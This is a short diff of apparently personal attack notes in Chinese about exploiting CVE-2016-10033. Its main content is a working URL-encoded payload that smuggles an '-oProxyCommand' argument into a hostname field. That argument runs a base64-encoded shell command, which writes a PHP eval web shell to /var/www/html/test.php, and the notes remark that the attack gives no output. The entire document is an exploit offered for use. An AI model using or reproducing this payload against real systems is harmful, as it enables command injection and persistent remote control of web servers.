@@ -1,0 +1,4 @@
+- 打 [[CVE-2016-10033]]
+- payload: `hostname=x+-oProxyCommand%3decho%09ZWNobyAnPD9waHAgZXZhbCgkX1BPU1RbImRhdGEiXSk7Pz4nID4gL3Zhci93d3cvaHRtbC90ZXN0LnBocA==|base64%09-d|sh}a&username=1&password=1`
+	- 其中的base64字符串是shell命令
+	- 没有回显
